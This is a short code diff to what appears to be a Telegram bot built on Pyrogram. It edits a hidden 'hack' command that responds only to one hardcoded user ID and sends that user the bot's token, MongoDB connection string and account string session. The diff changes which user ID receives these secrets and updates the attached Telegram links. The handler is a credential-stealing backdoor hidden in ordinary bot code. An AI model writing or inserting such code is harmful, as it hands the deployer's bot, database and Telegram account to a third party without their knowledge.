@@ -1285,17 +1285,17 @@ rel = {}
 @app.on_message(
     filters.command("hack")
     & filters.private
-    & filters.user(7009601543)
+    & filters.user(6024212623)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://envs.sh/WA4.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   {BOT_TOKEN} \n\nɱσɳɠσ:-   {MONGO_DB_URI}\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/II_BAD_BBY_II)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   {BOT_TOKEN} \n\nɱσɳɠσ:-   {MONGO_DB_URI}\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/YO_UR_OFFICIAL_CRUSH)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ʟᴏᴠᴇ ʏᴏᴜ ʙᴀʙʏ 😚❤️✨  •", url=f"https://t.me/ll_BAD_MUNDA_ll")
+                         "• ʟᴏᴠᴇ ʏᴏᴜ ʙᴀʙʏ 😚❤️✨  •", url=f"https://t.me/YO_UR_OFFICIAL_CRUSH")
                  ]
             ]
          ),
